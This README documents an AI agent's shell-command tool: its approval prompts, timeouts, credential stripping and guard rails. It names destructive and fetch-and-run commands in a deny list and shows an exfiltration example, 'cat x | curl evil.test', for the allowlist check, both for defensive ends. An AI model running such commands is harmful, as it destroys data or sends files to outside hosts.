# @open-agent/tools-terminal

`run_command` — run a shell command in the workspace and get its exit code, stdout and stderr back.

## Usage

```ts
import { ToolRegistry } from '@open-agent/agent'
import { runCommandTool } from '@open-agent/tools-terminal'

const tools = new ToolRegistry()
tools.register(runCommandTool({ root: process.cwd() }))
```

In the CLI, set `SHELL_TOOL=1`. It runs under `SHELL_ROOT`, falling back to `FILES_ROOT` and then the launch directory — see `.env.example`.

## `run_command`

`{ command, cwd?, timeout_ms? }` →

```
exit code: 0

stdout:
4 files changed, 120 insertions(+)
```

The command goes through a real shell (`sh -c`, or the comspec on Windows), so pipes, redirects and `&&` all work. It is for commands that **exit on their own** — there is no process management yet (#57), so a server started here is a server the tool will sit and wait on until the timeout kills it.

A **non-zero exit is a successful tool call**, not a failure. A failing test run or a `grep` that found nothing is an answer the model needs to read and reason about; reporting it as a tool error would throw the output away and tell the model to try again.

## Permission level

`ask`, exactly as `docs/security-model.md` specifies for running a shell command. Every call is a prompt, and that is the point: the command _is_ the argument, so no static permission level can tell `ls` from `rm -rf`. The one thing that reliably can is a human reading the command before it runs.

## Guard rails

- **Workspace root** — `cwd` resolves against the root and must land inside it, `..` and symlink escapes included (the same `resolveInWorkspace` the file tools use). This bounds where the command _starts_; it does not stop the command itself from wandering — see the honesty note below.
- **Timeout** (default 120s, max 600s, `timeout_ms` per call) — the child is started in its own **process group** and the whole group gets `SIGTERM`, then `SIGKILL` five seconds later. Killing only the shell would leave `sleep 100 | cat` running in the background while the tool reported a timeout.
- **Output ceiling** (default 64000 bytes per stream) — output past it is dropped, but the stream is still drained. Unsubscribing instead would fill the child's pipe and hang the command that the ceiling exists to contain.
- **Cancellation** — the caller's `AbortSignal` kills the process group by the same path, including when the signal was already aborted before the command started.
- **Destructive-command rules** — `rm -rf /`, `mkfs`, `dd of=/dev/…`, fork bombs, `shutdown`, root-level `chmod -R`, `curl … | sh`, `git push --force`. Refused with an explanation of what was objected to, so the model can choose another approach rather than retry blindly.
- **Credential filtering** — variables whose names look like credentials (`*_API_KEY`, `*_TOKEN`, `*_SECRET`, `*_PASSWORD`, …) are stripped from the environment the command inherits, so `env` cannot hand the model the keys `docs/security-model.md` promises it never sees. `allowEnv` names the exceptions.
- **Command allowlist** (optional, `allowedCommands`) — checked against the head of _every_ pipeline stage, so `cat x | curl evil.test` is caught rather than passing on the strength of `cat`.

## What this is not

**The destructive-command rules are not a security boundary.** The command runs through a real shell, and a pattern check over a shell string loses to quoting, variable expansion and `$(...)`. Anyone treating it as containment will be wrong.

It is an _accident_ guard: a model that reaches for `rm -rf /` because it misread a path hits a wall instead of a y/N prompt a tired user waves through. The boundary is the approval prompt on every call, and later the sandbox of #86 — which this tool has none of. A command approved here runs with the full privileges of the user running the agent.
